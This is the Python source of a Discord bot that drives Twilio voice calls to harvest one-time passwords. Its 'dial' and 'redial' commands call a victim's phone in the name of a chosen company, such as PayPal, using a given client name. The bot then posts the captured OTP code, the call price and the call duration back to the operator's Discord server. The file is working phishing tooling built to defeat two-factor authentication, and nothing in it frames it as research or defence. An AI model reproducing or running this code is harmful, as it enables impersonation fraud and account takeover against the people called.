import time
import os
import discord
from discord_slash import SlashCommand, SlashContext
from discord.ext import commands
from twilio.rest import Client
import json
from flask import Flask

intents = discord.Intents.default()
intents.typing = False
intents.presences = False

app = Flask(__name__)
client_discord = commands.Bot(command_prefix='', intents=intents)
slash = SlashCommand(client_discord, sync_commands=True)

if not 'Config.txt' in os.listdir():
    open('Config.txt', 'w').write('{"account_sid":"?", "auth_token":"?", "Twilio Phone Number":"+1?", "ngrok_url":"https://you-url.ngrok.io", "server_id":"?", "bot_token":"?"}')
if not 'grabbed_otp.txt' in os.listdir():
    open('grabbed_otp.txt', 'w').close()
if not 'Details' in os.listdir():
    os.mkdir('Details')
if not 'Company Name.txt' in os.listdir('Details'):
    open('Details/Company_Name.txt', 'w').close()
if not 'Digits.txt' in os.listdir('Details'):
    open('Details/Digits.txt', 'w').close()
if not 'Client_Name.txt' in os.listdir('Details'):
    open('Details/Client_Name.txt', 'w').close()

raw_config = json.loads(open('Config.txt', 'r').read())
account_sid = raw_config['account_sid']
auth_token = raw_config['auth_token']
your_twilio_phone_number = raw_config['Twilio Phone Number']
ngrok = raw_config['ngrok_url']
client = Client(account_sid, auth_token)
server_id = int(raw_config['server_id'])

@client_discord.event
async def on_ready():
    print('Bot is ready.')

@slash.slash(
    name='dial',
    description='This is the command to start making calls',
    guild_ids=[server_id],
    options=[
        {
            "name": "cell_phone",
            "description": "Add +1 E.G +1987654321",
            "required": True,
            "type": 3
        },
        {
            "name": "otp_digits",
            "description": "E.G 8,6 or 4",
            "required": True,
            "type": 3
        },
        {
            "name": "client_name",
            "description": "E.G: Smith",
            "required": True,
            "type": 3
        },
        {
            "name": "company_name",
            "description": "E.G: Paypal",
            "required": True,
            "type": 3
        }
    ]
)
async def _call(ctx: SlashContext, cell_phone: str, otp_digits: str, client_name: str, company_name: str):
    await ctx.send('Calling Initiated!')
    open('Details/Digits.txt', 'w').write(f'{otp_digits}')
    open('Details/Client_Name.txt', 'w').write(f'{client_name}')
    open('Details/Company_Name.txt', 'w').write(f'{company_name}')
    call = client.calls.create(
        url=f'{ngrok}/voice',
        to=f'{cell_phone}',
        from_=f'{your_twilio_phone_number}'
    )
    sid = call.sid
    print(sid)
    a = b = c = d = 0
    while True:
        call_status = client.calls(sid).fetch().status
        if call_status == 'queued':
            if a < 1:
                embed = discord.Embed(title='', description='Call Is Placed', color=discord.Colour.green())
                await ctx.send(embed=embed)
                a += 1
        elif call_status == 'ringing':
            if b < 1:
                embed = discord.Embed(title='', description='Cell Phone Is Ringing', color=discord.Colour.green())
                await ctx.send(embed=embed)
                b += 1
        elif call_status == 'in-progress':
            if c < 1:
                embed = discord.Embed(title='', description='Call In Progress', color=discord.Colour.green())
                await ctx.send(embed=embed)
                c += 1
        elif call_status == 'completed':
            embed = discord.Embed(title='', description='Call Successfully Completed', color=discord.Colour.green())
            await ctx.send(embed=embed)
            break
        elif call_status == 'failed':
            embed = discord.Embed(title='', description='Call Failed', color=discord.Colour.red())
            await ctx.send(embed=embed)
            break
        elif call_status == 'no-answer':
            embed = discord.Embed(title='', description='Call Was Not Answered', color=discord.Colour.red())
            await ctx.send(embed=embed)
            break
        elif call_status == 'canceled':
            embed = discord.Embed(title='', description='Call Was Canceled By The Client', color=discord.Colour.red())
            await ctx.send(embed=embed)
            break
        elif call_status == 'busy':
            embed = discord.Embed(title='', description='User Busy This Call', color=discord.Colour.red())
            await ctx.send(embed=embed)
            break
        time.sleep(1)

    time.sleep(1)
    otp = open(f'grabbed_otp.txt', 'r').read()
    call1 = client.calls(sid).fetch()
    if otp == '':
        embed = discord.Embed(title='', description=f'Unable To Grab OTP\n\nPrice: {call1.price}\nDuration: {call1.duration} secs', color=discord.Colour.red())
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title='', description=f'{otp}\n\nPrice: {call1.price}\nDuration: {call1.duration} secs', color=discord.Colour.green())
        await ctx.send(embed=embed)
    open('grabbed_otp.txt', 'w').close()

@slash.slash(
    name='redial',
    description='If the OTP code supplied is not valid',
    guild_ids=[server_id],
    options=[
        {
            "name": "cell_phone",
            "description": "Add +1 E.G +1987654321",
            "required": True,
            "type": 3
        },
        {
            "name": "otp_digits",
            "description": "E.G 8,6 or 4",
            "required": True,
            "type": 3
        },
        {
            "name": "client_name",
            "description": "E.G: Smith",
            "required": True,
            "type": 3
        },
        {
            "name": "company_name",
            "description": "E.G: Paypal",
            "required": True,
            "type": 3
        }
    ]
)
async def _redial(ctx: SlashContext, cell_phone: str, otp_digits: str, client_name: str, company_name: str):
    open('Details/Digits.txt', 'w').write(f'{otp_digits}')
    open('Details/Client_Name.txt', 'w').write(f'{client_name}')
    open('Details/Company_Name.txt', 'w').write(f'{company_name}')
    call = client.calls.create(
        url=f'{ngrok}/voiceagain',
        to=f'{cell_phone}',
        from_=your_twilio_phone_number
    )
    sid = call.sid
    print(sid)
    a = 0
    b = 0
    c = 0
    d = 0
    while True:
        call_status = client.calls(sid).fetch().status
        if call_status == 'queued':
            if a < 1:
                embed = discord.Embed(title='', description='Call Is Placed', color=discord.Colour.green())
                await ctx.send(embed=embed)
                a += 1
        elif call_status == 'ringing':
            if b < 1:
                embed = discord.Embed(title='', description='Cell Phone Is Ringing', color=discord.Colour.green())
                await ctx.send(embed=embed)
                b += 1
        elif call_status == 'in-progress':
            if c < 1:
                embed = discord.Embed(title='', description='Call In Progress', color=discord.Colour.green())
                await ctx.send(embed=embed)
                c += 1
        elif call_status == 'completed':
            embed = discord.Embed(title='', description='Call Successfully Completed', color=discord.Colour.green())
            await ctx.send(embed=embed)
            break
        elif call_status == 'failed':
            embed = discord.Embed(title='', description='Call Failed', color=discord.Colour.red())
            await ctx.send(embed=embed)
            break
        elif call_status == 'no-answer':
            embed = discord.Embed(title='', description='Call Was Not Answered', color=discord.Colour.red())
            await ctx.send(embed=embed)
            break
        elif call_status == 'canceled':
            embed = discord.Embed(title='', description='Call Was Canceled By The Client', color=discord.Colour.red())
            await ctx.send(embed=embed)
            break
        elif call_status == 'busy':
            embed = discord.Embed(title='', description='User Busy This Call', color=discord.Colour.red())
            await ctx.send(embed=embed)
            break
        time.sleep(1)

    time.sleep(2)
    otp = open(f'grabbed_otp.txt', 'r').read()
    call1 = client.calls(sid).fetch()
    if otp == '':
        embed = discord.Embed(title='', description=f'Unable To Grab OTP\n\nPrice: {call1.price}\nDuration: {call1.duration} secs', color=discord.Colour.red())
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title='Just a Normal Bot', description=f'{otp}\n\nPrice: {call1.price}\nDuration: {call1.duration} secs', color=discord.Colour.green())
        await ctx.send(embed=embed)
    open('grabbed_otp.txt', 'w').close()


client_discord.run(
    raw_config['bot_token']
)
